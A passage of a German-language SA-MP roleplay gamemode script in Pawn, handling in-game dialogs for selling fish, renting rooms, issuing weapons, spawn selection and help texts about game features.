	{
 		if(response)
	    {
			new rand = random(2);
  			if(fischauswahl[playerid] == 4)
	        {
	        	if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens eine Schildkröte verkaufen!");
		        for(new x = 0; x < sizeof(SpielerInventar[]); x++)
				{
					if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1609)
					{
					    if(strval(inputtext) > SpielerInventar[playerid][x][1]) return SendClientMessage(playerid,COLOR_RED,"So viele Schildkröten hast du nicht!");
					    SpielerInventar[playerid][x][1] -= strval(inputtext);
					    if(SpielerInventar[playerid][x][1] == 0)
					    {
					        SpielerInventar[playerid][x][0] = -1;
 	        				PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7], -1);
					        PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
							PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
					    }
					    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
            			PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
            			if(rand == 1)
            			{
						    GebeGeld(playerid,floatstr(inputtext)*350);
						    format(string,sizeof string,"Ted: %d Schildkröten für %.2f$ verkauft.",strval(inputtext),floatstr(inputtext)*350);
						    SendClientMessage(playerid,COLOR_GREEN,string);
						}
						else
						{
						    SendClientMessage(playerid,COLOR_WHITE,"Ted: Abgezockt... Zieh leine....");
						}
					}
		        }
			}
			else if(fischauswahl[playerid] == 5)
	        {
	        	if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens einen Delfin verkaufen!");
		        for(new x = 0; x < sizeof(SpielerInventar[]); x++)
				{
					if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1607)
					{
					    if(strval(inputtext) > SpielerInventar[playerid][x][1]) return SendClientMessage(playerid,COLOR_RED,"So viele Delfine hast du nicht!");
					    SpielerInventar[playerid][x][1] -= strval(inputtext);
					    if(SpielerInventar[playerid][x][1] == 0)
					    {
					        SpielerInventar[playerid][x][0] = -1;
 	        				PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7], -1);
					        PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
							PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
					    }
					    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
            			PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
            			if(rand == 1){
						    GebeGeld(playerid,floatstr(inputtext)*200);
						    format(string,sizeof string,"%d Delfine für %.2f$ verkauft.",strval(inputtext),floatstr(inputtext)*200);
						    SendClientMessage(playerid,COLOR_GREEN,string);
						}
						else
						{
						    SendClientMessage(playerid,COLOR_WHITE,"Ted: Abgezockt... Zieh leine....");
						}
					}
		        }
			}
			else if(fischauswahl[playerid] == 6)
	        {
	        	if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens einen Hai verkaufen!");
		        for(new x = 0; x < sizeof(SpielerInventar[]); x++)
				{
					if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1608)
					{
					    if(strval(inputtext) > SpielerInventar[playerid][x][1]) return SendClientMessage(playerid,COLOR_RED,"So viele Haie hast du nicht!");
					    SpielerInventar[playerid][x][1] -= strval(inputtext);
					    if(SpielerInventar[playerid][x][1] == 0)
					    {
					        SpielerInventar[playerid][x][0] = -1;
 	        				PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7], -1);
					        PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
							PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
					    }
					    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
            			PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
            			if(rand == 1){
						    GebeGeld(playerid,floatstr(inputtext)*150);
						    format(string,sizeof string,"%d Haie für %.2f$ verkauft.",strval(inputtext),floatstr(inputtext)*150);
						    SendClientMessage(playerid,COLOR_GREEN,string);
						}
						else
						{
						    SendClientMessage(playerid,COLOR_WHITE,"Ted: Abgezockt... Zieh leine....");
						}
					}
		        }
			}
			else if(fischauswahl[playerid] == 7)
	        {
	        	if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens eine Schildkröte eintauschen!");
		        for(new x = 0; x < sizeof(SpielerInventar[]); x++)
				{
					if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1609)
					{
					    if(strval(inputtext) > SpielerInventar[playerid][x][1]) return SendClientMessage(playerid,COLOR_RED,"So viele Schildkröten hast du nicht!");
					    SpielerInventar[playerid][x][1] -= strval(inputtext);
					    if(SpielerInventar[playerid][x][1] == 0)
					    {
					        SpielerInventar[playerid][x][0] = -1;
 	        				PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7], -1);
					        PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
							PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
					    }
					    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
            			PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
					    format(string,sizeof string,"Ted: Habe dir einen Punkt auf deiner Karte gesetzt, da kannst du deine %dg Koks abholen.",strval(inputtext)*3);
					    SendClientMessage(playerid,COLOR_GREEN,string);
					    PlayerKoks[playerid] += strval(inputtext)*3;
					    SetPlayerCheckpoint(playerid,6351.5728,-9504.5996,4.5766,2);
					}
		        }
			}
			fischauswahl[playerid] = 0;
	    }
	}
	if(dialogid == DIALOG_VERKAUFFISCH)
	{
 		if(response)
	    {
	        if(fischauswahl[playerid] == 1)
	        {
	        	if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens einen Hering verkaufen!");
		        for(new x = 0; x < sizeof(SpielerInventar[]); x++)
				{
					if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == 19630)
					{
					    if(strval(inputtext) > SpielerInventar[playerid][x][1]) return SendClientMessage(playerid,COLOR_RED,"So viele Heringe hast du nicht!");
					    SpielerInventar[playerid][x][1] -= strval(inputtext);
					    if(SpielerInventar[playerid][x][1] == 0)
					    {
					        SpielerInventar[playerid][x][0] = -1;
 	        				PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7], -1);
					        PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
							PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
					    }
       					format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
            			PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
					    GebeGeld(playerid,floatstr(inputtext)*10.0);
					    format(string,sizeof string,"%d Heringe für %.2f$ verkauft.",strval(inputtext),floatstr(inputtext)*10.0);
					    SendClientMessage(playerid,COLOR_GREEN,string);
					    if(SpielerInfo[playerid][ufMarkt] == 0)
				        {
				        	SpielerInfo[playerid][ufMarkt] = 1;
				        	Missionenaktu(playerid);
				        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Fischmarkt besucht {0080FF}(/missionen)");
                            new Float:belohnung;
			            	belohnung = 150;
			            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
							GebeGeld(playerid,belohnung);
						}
					}
		        }
			}
			else if(fischauswahl[playerid] == 2)
	        {
	        	if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens einen Seestern verkaufen!");
		        for(new x = 0; x < sizeof(SpielerInventar[]); x++)
				{
					if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == 902)
					{
					    if(strval(inputtext) > SpielerInventar[playerid][x][1]) return SendClientMessage(playerid,COLOR_RED,"So viele Seesterne hast du nicht!");
					    SpielerInventar[playerid][x][1] -= strval(inputtext);
					    if(SpielerInventar[playerid][x][1] == 0)
					    {
					        SpielerInventar[playerid][x][0] = -1;
 	        				PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7], -1);
					        PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
							PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
					    }
					    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
            			PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
					    GebeGeld(playerid,floatstr(inputtext)*2);
					    format(string,sizeof string,"%d Seesterne für %.2f$ verkauft.",strval(inputtext),floatstr(inputtext)*2);
					    SendClientMessage(playerid,COLOR_GREEN,string);
					    if(SpielerInfo[playerid][ufMarkt] == 0)
				        {
				        	SpielerInfo[playerid][ufMarkt] = 1;
				        	Missionenaktu(playerid);
				        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Fischmarkt besucht {0080FF}(/missionen)");
                            new Float:belohnung;
			            	belohnung = 150;
			            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
							GebeGeld(playerid,belohnung);
						}
					}
		        }
			}
			else if(fischauswahl[playerid] == 3)
	        {
	        	if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens eine Qualle verkaufen!");
		        for(new x = 0; x < sizeof(SpielerInventar[]); x++)
				{
					if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1603)
					{
					    if(strval(inputtext) > SpielerInventar[playerid][x][1]) return SendClientMessage(playerid,COLOR_RED,"So viele Quallen hast du nicht!");
					    SpielerInventar[playerid][x][1] -= strval(inputtext);
					    if(SpielerInventar[playerid][x][1] == 0)
					    {
					        SpielerInventar[playerid][x][0] = -1;
 	        				PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7], -1);
					        PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
							PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
					    }
					    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
            			PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
					    GebeGeld(playerid,floatstr(inputtext)*5);
					    format(string,sizeof string,"%d Quallen für %.2f$ verkauft.",strval(inputtext),floatstr(inputtext)*5);
					    SendClientMessage(playerid,COLOR_GREEN,string);
					    if(SpielerInfo[playerid][ufMarkt] == 0)
				        {
				        	SpielerInfo[playerid][ufMarkt] = 1;
				        	Missionenaktu(playerid);
				        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Fischmarkt besucht {0080FF}(/missionen)");
                            new Float:belohnung;
			            	belohnung = 150;
			            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
							GebeGeld(playerid,belohnung);
						}
					}
		        }
			}
			fischauswahl[playerid] = 0;
	    }
	}
	if(dialogid == DIALOG_PFAND)
	{

	    if(response)
	    {
	        if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens eine Pfandflasche verkaufen!");
	        for(new x = 0; x < sizeof(SpielerInventar[]); x++)
			{
				if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1486)
				{
				    if(strval(inputtext) > SpielerInventar[playerid][x][1]) return SendClientMessage(playerid,COLOR_RED,"So viele Pfandflaschen hast du nicht!");
				    SpielerInventar[playerid][x][1] -= strval(inputtext);
				    if(SpielerInventar[playerid][x][1] == 0)
				    {
				        SpielerInventar[playerid][x][0] = -1;
				    }
				    GebeGeld(playerid,floatstr(inputtext)*0.25);
				    format(string,sizeof string,"%d Pfandflaschen für %.2f$ verkauft.",strval(inputtext),floatstr(inputtext)*0.25);
				    SendClientMessage(playerid,COLOR_GREEN,string);
				    break;
				}
	        }
	    }
	}
	if(dialogid == DIALOG_TELEBUCH)
	{

		if(response)
		{
			SpielerInfo[playerid][uTelefonbucheintrag] = 1;
		    SendClientMessage(playerid,COLOR_GREEN,"Nummer erfolgreich ins Telefonbuch eingetragen!");
		}
	}
	if(dialogid == DIALOG_HOTEL)
	{

	    if(response)
	    {
	        for(new x = 0; x < sizeof(HausInfo); x++)
	   		{
	        	if(HausInfo[x][hHotel] != 0 && HausInfo[x][hBesitzer] == -1)
	        	{
	        		SendClientMessage(playerid,COLOR_GREEN,"Hotelzimmer gemietet!");
	       		 	GebeGeld(playerid,-200);
	       		 	SpielerInfo[playerid][uHausschluessel] = x;
	       		 	HausInfo[x][hBesitzer] = SpielerInfo[playerid][uID];
	       		 	HausSpeichern(x);
					return 1;
				}
			}
			SendClientMessage(playerid,COLOR_RED,"Es ist kein Hotelzimmer mehr frei!");
	    }
	}
	if(dialogid == DIALOG_MIETEN)
	{
	    if(response)
	    {
	        SpielerInfo[playerid][uHausschluessel] = HouseChosen[playerid];
	        SendClientMessage(playerid,COLOR_RED,"Haus gemietet!");
	    }
	}
	if(dialogid == DIALOG_FBI)
	{

	    if(response)
	    {
	        switch(listitem)
	        {
				case 0:
				{
				    GebeWaffe(playerid,3,1);
				}
				case 1:
				{
				    GebeWaffe(playerid,24,200);
				}
				case 2:
				{
				    GebeWaffe(playerid,25,50);
				}
				case 3:
				{
				    GebeWaffe(playerid,29,400);
				}
				case 4:
				{
				    GebeWaffe(playerid,31,250);
				}
				case 5:
				{
				    GebeWaffe(playerid,27,150);
				}
	        }
	    }
	}
	if(dialogid == DIALOG_THEORIE)
	{
	    SendClientMessage(playerid,COLOR_GREEN,"Beantworte nun die folgenden Fragen, indem du die richtige Antwort anklickst.");
	    FahrschulPruef[playerid] = 0;
     	FahrschulPruef_Fehler[playerid] = 0;
      	PlayerTextDrawShow(playerid,FahrschuleTheo[playerid][4]);
		PlayerTextDrawShow(playerid,FahrschuleTheo[playerid][5]);
	 	PlayerTextDrawShow(playerid,FahrschuleTheo[playerid][0]);
 	 	PlayerTextDrawShow(playerid,FahrschuleTheo[playerid][1]);
	    PlayerTextDrawShow(playerid,FahrschuleTheo[playerid][2]);
	    PlayerTextDrawShow(playerid,FahrschuleTheo[playerid][3]);
		PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][0],FahrschulTheoretisch[FahrschulPruef[playerid]][Frage]);
		PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][1],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort1]);
		PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][2],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort2]);
		PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][3],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort3]);
		SelectTextDraw(playerid, 0x00FF00FF);
		TogglePlayerControllable(playerid,false);
	}
	if(dialogid == DIALOG_FAHRSCHULE)
	{
	    if(response)
	    {
	        SendClientMessage(playerid,COLOR_GREEN,"Fahrprüfung gestartet.");
	        Fahrpruefung[playerid] = 1;
	    }
	}
	if(dialogid == DIALOG_ORTSPAWN)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            imtut[playerid] = 0;
	            SetPlayerVirtualWorld(playerid,0);
	            SpielerInfo[playerid][uTutorial] = 1;
      			Teleport(playerid,1849.6346,-9281.2666,4.4122);
   				SetSpawnInfo(playerid, 0 ,3, 1849.6346,-9281.2666,4.4122,113.8989, 0, 0, 0, 0, 0, 0);
				SpawnPlayer(playerid);
   				SpielerInfo[playerid][uEingeloggt] = 1;
				TogglePlayerSpectating(playerid,false);
				SpawnPlayer(playerid);
				Unfreeze(playerid);
				SetPlayerVirtualWorld(playerid,0);
				SpielerInfo[playerid][uSpawn] = 1;
				SendClientMessage(playerid,COLOR_WHITE,"Wähle nun deinen gewünschten Spawn. Änderbar unter {B40404}/spawns");
				ShowPlayerDialog(playerid,DIALOG_SPAWNENREG,DIALOG_STYLE_LIST,"Spawn Auswahl","Spawnen auf ausgeloggter Position\nSpawnen im LS Motel oder SF Motel","Wählen","Abbrechen");
				SetTimerEx("LS",100,0,"d",playerid);
				StopAudioStreamForPlayer(playerid);//Andy stop CISound
				Freeze(playerid); SetTimerEx("Unfreeze",2000,0,"d",playerid);
				format(string,sizeof string,"UPDATE `user` SET eingeloggt='1' WHERE userID='%d'",SpielerInfo[playerid][uID]);
				mysql_query(dbhandle, string);
				new userip[25],query[300];
		    	GetPlayerIp(playerid, userip, sizeof(userip));
    			format(string, sizeof(string), "INSERT INTO usersitzungen (userid, username, userip,login) VALUES ('%i','%s','%s','%i')", SpielerInfo[playerid][uID], PlayerName(playerid), userip,gettime());
		    	mysql_query(dbhandle, string);
		    	printf("%s",query);
		    	SpielerInfo[playerid][sitzungsid]= cache_insert_id();
                if(sperrzone == 1)
				{
					GangZoneShowForPlayer(playerid,sperrzonef, 0xE10000AA);
			 		GangZoneFlashForPlayer(playerid,sperrzonef,0x0069FFAA);
			 		SendClientMessage(playerid,COLOR_RED,"ACHTUNG: Es gibt eine Sperrzone, diese darf von Zivilisten nicht betreten werden!");
				}
				for(new x = 0; x < sizeof(UserBr); x++)
				{
					TextDrawShowForPlayer(playerid,UserBr[x]);
					PlayerTextDrawShow(playerid,Orttext[playerid]);
				}
                for(new i = 0; i < 30; i++)
			    {
			    	PlayerTextDrawShow(playerid,Missionen[playerid][i]);
			    	SpielerInfo[playerid][uMissionen] = 1;
			    	Missionenaktu(playerid);
				}
				return 1;
			}
            if(listitem == 1)
	        {
	            SetPlayerVirtualWorld(playerid,0);
         		imtut[playerid] = 0;
				Teleport(playerid,6383.0757,-7741.6279,7.8744);
				SpielerInfo[playerid][uTutorial] = 1;
   				SetSpawnInfo(playerid, 0 ,3,6383.0757,-7741.6279,7.8744,324.7975, 0, 0, 0, 0, 0, 0);
				SpawnPlayer(playerid);
   				SpielerInfo[playerid][uEingeloggt] = 1;
				TogglePlayerSpectating(playerid,false);
				SpawnPlayer(playerid);
				Unfreeze(playerid);
				SpielerInfo[playerid][uSpawn] = 2;
				SendClientMessage(playerid,COLOR_GREEN,"Herzlich Willkommen auf County Islands! Wähle nun deinen gewünschten Spawn. Änderbar unter /spawns");
				ShowPlayerDialog(playerid,DIALOG_SPAWNENREG,DIALOG_STYLE_LIST,"Spawn Auswahl","Spawnen auf ausgeloggter Position\nSpawnen im LS Motel oder SF Motel","Wählen","Abbrechen");
				SetTimerEx("SF",100,0,"d",playerid);
				StopAudioStreamForPlayer(playerid);//Andy stop CISound
				Freeze(playerid); SetTimerEx("Unfreeze",2000,0,"d",playerid);
				if(sperrzone == 1)
				{
					GangZoneShowForPlayer(playerid,sperrzonef, 0xE10000AA);
			 		GangZoneFlashForPlayer(playerid,sperrzonef,0x0069FFAA);
			 		SendClientMessage(playerid,COLOR_RED,"ACHTUNG: Es gibt eine Sperrzone, diese darf von Zivilisten nicht betreten werden!");
				}
				for(new x = 0; x < sizeof(UserBr); x++)
				{
					TextDrawShowForPlayer(playerid,UserBr[x]);
					PlayerTextDrawShow(playerid,Orttext[playerid]);
				}
				for(new i = 0; i < 30; i++)
			    {
			    	PlayerTextDrawShow(playerid,Missionen[playerid][i]);
			    	SpielerInfo[playerid][uMissionen] = 1;
			    	Missionenaktu(playerid);
				}
				return 1;
			}
			AccountSpeichern(playerid);
		}
	}
	if(dialogid == DIALOG_HILFE)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
				ShowPlayerDialog(playerid,DIALOG_ALLGEMEINE_HILFE, DIALOG_STYLE_LIST,"Allgemeine Hilfe", "Inventar\nPfandflaschen\nBankraub/Spieler rauben\nNeulings Hilfe\nHandyhilfe\nSchwarzmarkt/Gangwar/Mats\nSupport\nMöbel Hilfe\nDrogenhilfe\nAngelhilfe\nBombenklau\nAtombombe\nGeldtransporter", "Absenden", "Beenden");
				return 1;
			}
            if(listitem == 1)
	        {
	            new dialogstr[800] = "{FF0000}Fahrzeug Hilfe und Befehle{FFFFFF}\n\n Fahrzeuge können im Authohaus gekauft werden. Sollte man besitzer eines Fahrzeuges sein, bemerkt man schnell das es keinen park Befehl dafür geben wird.\n Fahrzeuge müssen mit /parken geparkt werden.\n Max. 2 Fahrzeuge kann man im Besitz haben, übersicht mit dem Befehl (/autos)\n";
	            strcat(dialogstr," Fahrzeuge können von Mechanikern abgeschleppt werden und müssen dann auch wieder freigekauft werden.\n In der Stadthalle muss ein Kennzeichen erworben werden, es ist Pflicht mit Kennzeichen zu fahren.\n\n\n Befehle für die Fahrzeuge:\n\n{FF0000}/autos /lock /licht /motor /motorhaube /kofferraum /reparieren /parken /rauswerfen \n\nIm Paint and Spray kann das Fahrzeug getunt werden, sowohl die Farbe ausgewählt werden.");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fahrzeughilfe",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 2)
	        {
	            new dialogstr[650] = "{FF0000}Haus Hilfe{FFFFFF}\n\n Um ein Haus kaufen zu können wird ein Personalausweis benötigt, natürlich auch das Geld.\n Um es nun kaufen zu können muss das rote [FORSALE] Schild angeklickt werden. Sollte es verschwunden sein ist man nun Hausbesitzer.\n Hausbesitzer können Möbel kaufen und selbst alles gestalten, Garten sowohl auch Innen.\n Türen können abgeschlossen werden, somit kann die Türe nicht mehr von fremden Spielern geöffnet werden.)";
	            strcat(dialogstr,"\n\n{FF0000}Geschäftshilfe{FFFFFF}\n\n Bei einem Geschäft wird genau das gleiche für einen Kauf benötigt. [FORSALE] Schild anklicken und kaufen. Befehle: /kasse /tankpreis für tankstellen");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Immobilien",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 3)
	        {
				ShowPlayerDialog(playerid,DIALOG_JOB_HILFE,DIALOG_STYLE_LIST,"Job Hilfe","Farmer\nMüllmann\nTaxifahrer\nBusfahrer\nTrucker\nHolzfäller", "Weiter", "Beenden");
				return 1;
			}
			if(listitem == 4)
	        {
	            new dialogstr[850] = "{FF0000}Hilfe zur Fraktion{FFFFFF}\n\n Nutze den Befehl /fraktion, dabei gibt es zwei Sichten, ein Leader hat mehr Zugriffe als ein Mitglied der Fraktion,\n Im Panel kann angezeigt werden wer in Fraktion Mitglied ist:\n\n- Wann er zuletzt online war und Rang\n- Ihn kicken auch wenn er offline ist\n- Ihm einen Rang zuweisen\n\n Außerdem kann man aktuelle Fahrzeuge sehen die im Besitz der Fraktion sind.\n";
	            strcat(dialogstr," Fraktionsfahrzeuge muss man über das Panel parken.\n\n- Man kann einen Rang zuweisen ab wann man es fahren darf\n- Löschen und reparieren\n\n Außerdem kann man auf die Fraktionskasse dort zugreifen,\n\n- Einzahlen\n- Auszahlen\n- Geldbetrag sehen\n\n Jede Fraktion kann andere Fahrzeuge kaufen und hat dazu auch eine andere farbe deren Fahrzeuge.\n\n Befehle deiner Fraktion {FF0000}/fhelp{FFFFFF} zeigt alle deine Befehle an!");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktionshilfe",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 5)
	        {
	            new dialogstr[450] = "{FF0000}Allgemeine Befehle{FFFFFF}\n\nChats: /chat /o /s /me /m /f /p\n /spawns /stats /rauben /musikbox /handy /nummer /inventar /verstauen /navi /zahlen /fraktionen /fhelp\nHaus: /verkaufen /miete /moebel /katalog\nGeschäft: /verkaufen /kasse\n/support /fl /ende\n /leader /zuruck /afk /back /animlist /animoff\n/zeigeperso /zeigescheine\n/video /zeiger /missionen /skins\n/support Für weitere Fragen!";
	            strcat(dialogstr,"");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Alle Befehle",dialogstr, "Schließen", "");
				return 1;
			}
		}
	}
	if(dialogid == DIALOG_ALLGEMEINE_HILFE)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            new dialogstr[850] = "{FF0000}Spieler Inventar{FFFFFF}\n\n Du kannst in deinem Inventar Sachen verstauen, wie Waffen, Drogen, Essen, Pfandflaschen, Objekte z.B eine Angel, und vieles mehr! Um deinen Inventar öffnen zu können\n benutze /inventar oder drücke die Taste [Z], jetzt auf [Textdraw-Zeiger], nun besitzt Du einen Mauszeiger, klicke mit der Maus unten links auf den Koffer, [Inventar]\n , nun befindest Du dich im Inventar.";
	            strcat(dialogstr," Sollte der Inventar wieder geschlossen werden wollen, einfach erneut anklicken und [ESC] drücken um den Mauzeiger verschwinden zu lassen.\n Um Sachen aus dem Inventar zu nehmen oder zu benutzen klicke auf das Objekt, sprich Bild in dem Inventarfenster.\n Um Waffen, Drogen oder anderes verstauen zu können benutze den Befehl {FF0000}/verstauen{FFFFFF}. Wenn du Waffen oder Drogen handeln willst einfach auf das Objekt im Inventar klicken. ");
				ShowPlayerDialog(playerid, DIALOG_INVENTAR_HILFE, DIALOG_STYLE_MSGBOX, "Inventar benutzung",dialogstr,"Schließen", "");
				return 1;
			}
	        if(listitem == 1)
	        {
	            new dialogstr[635] = "{FF0000}Wie kann ich Pfandflaschen sammeln?{FFFFFF}\n\n Um Pfandflaschen deinem Inventar hinzufügen zu können musst Du als aller ersters eine Mülltonne auffinden. Steht man vor einer Mülltonne drücke als erster Taste [Z],\n nun klicke auf [Objekte-Zeiger], nun per Mauszeiger auf die Mülltonneklicken, jetzt klicke auf [durchsuchen],\n nun können 3 Möglichkeiten angezeigt werden,\n\n 1. Du hast nichts gefunden!\n";
	            strcat(dialogstr," 2. Du hast eine Pfandflasche gefunden!\n 3. Du hast ein paar Cent gefunden!\n\n Im Inventar kann nachgesehen werden wie viele Pfandflaschen im Besitzt sind. Pfandflaschen können im 24/7 verkauft werden, je Flasche 0,25 Cent.");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Pfandflaschen sammeln",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 2)
	        {
	            new dialogstr[910] = "{FF0000}Wie überfalle ich eine Bank?{FFFFFF}\n\n Du brauchst zuerst eine Bombe, genaueres dazu kannst du nachlesen in der Bombenklau Erklärung.\n Sobald du eine Bombe hast kannst du Lake Sorten oder in Santa Felton die Banktüren aufsprengen. Drücke dazu einmal 'H' wenn du dich \n an einer Tresortür befindest.";
	            strcat(dialogstr," Nun musst du diese Aktion noch mit dem Button 'Ja' im Dialog bestätigen. Nach 30 Sekunden sprengt sich die Tür automatisch ab.\n Achtung, halte Abstand von der Explosion! Nun kannst du die Bankfächer mit 'H' ausrauben! Das Geld geht nach 15 Minuten automatisch von der Tasche auf die Hand.\n\n{FF0000}Spieler überfallen{FFFFFF}\n\nNutze /rauben [ID/Name] und laufe dem Spieler 10 Sekunden hinterher,\n bei Erfolg bekommst Du 5% Geld was der Spieler auf der Hand hat.\n\n");
                ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Bankraub",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 3)
	        {
	            new dialogstr[820] = "{FF0000}Hilfe für neue Spieler!{FFFFFF}\n\n Herzlich Willkommen auf County Islands, schön das Du den Weg zu uns gefunden hast, dich erwartet viel Spaß hier!\n Um sich in Motels oder Häuser einmieten zu können brauchst Du einen Personalausweis,\n dieser kann in jeder Stadthalle beantragt werden. Auch eine Auswahl an Jobs gibt es dort um Geld zu verdienen.\n";
	            strcat(dialogstr," damit könnte Deine Miete bezahlt werden und auf ein Auto, Haus oder sogar Geschäft kannst Du auch sparen.\n Vieles auf unserem Server kann mit der Taste ´H´ agiert werden, oder vieles ist auch anklickbar, wir benutzen selten Befehle.\n Um etwas anklicken zu können drücke als erster die Taste [Z], nun hast Du die wahl zwischen [Objekte-Zeiger] und [TextdrawZeiger],\n mit Obejekte-Zeiger können nur Objekte angeklickt werden und TextdrawZeiger nur Textdraws.");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Neuhilfe",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 4)
			{
	            new dialogstr[650] = "{FF0000}Handyhilfe{FFFFFF}\n\n Das Handy kann mit dem Befehl (/handy) aufgerufen werden.\n Du kannst ein Handy im 24/7 Shop erwerben.\n Sollte man nun stolzer Besitzer eines Handys sein, so sollte man auch gleich ein Telefonbuch kaufen um andere Nummern herausfinden zu können, mit {FF0000}/nummer ID{FFFFFF}.\n";
	            strcat(dialogstr," Nutze (/handy), um eine Nummer eingeben zu können, Drücke Taste [Z] nun auf Textdrawzeiger und Tippe mit dem Mauszeigern die Nummer ein, mit der grünen Taste kann man anrufen und auch Telefonate annehmen.\n Mit der roten Taste auflegen. Um das Handy wieder weg zu packen erneut drücke [ESC] und gibt erneut (/handy) ein.");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Handysystem",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 5)
			{
